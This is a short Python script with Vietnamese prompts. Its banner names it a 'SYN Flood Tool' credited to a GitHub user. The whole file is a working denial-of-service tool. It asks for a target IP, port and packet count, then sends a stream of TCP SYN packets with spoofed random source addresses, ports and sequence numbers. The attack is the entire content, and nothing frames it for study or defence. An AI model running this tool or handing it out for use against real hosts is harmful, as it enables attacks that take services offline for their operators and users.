#!/usr/bin/python

from scapy.all import *
import os
import sys
import random

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print "Các gói đang gửi ..."
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTổng số gói đã gửi: %i\n" % total)


def info():
	os.system("clear")
	print "########################################"
	print "#          github.com/DauDau432        #"
	print "########################################"
	print "# Chào mừng bạn đến với SYN Flood Tool #"
	print "########################################"

	dstIP = raw_input ("\nIP mục tiêu: ")
	dstPort = input ("Cổng mục tiêu: ")
	
	return dstIP,int(dstPort)
	

def main():
	dstIP,dstPort = info()
	counter = input ("Bạn muốn gửi bao nhiêu gói: ")
	SYN_Flood(dstIP,dstPort,int(counter))

main()
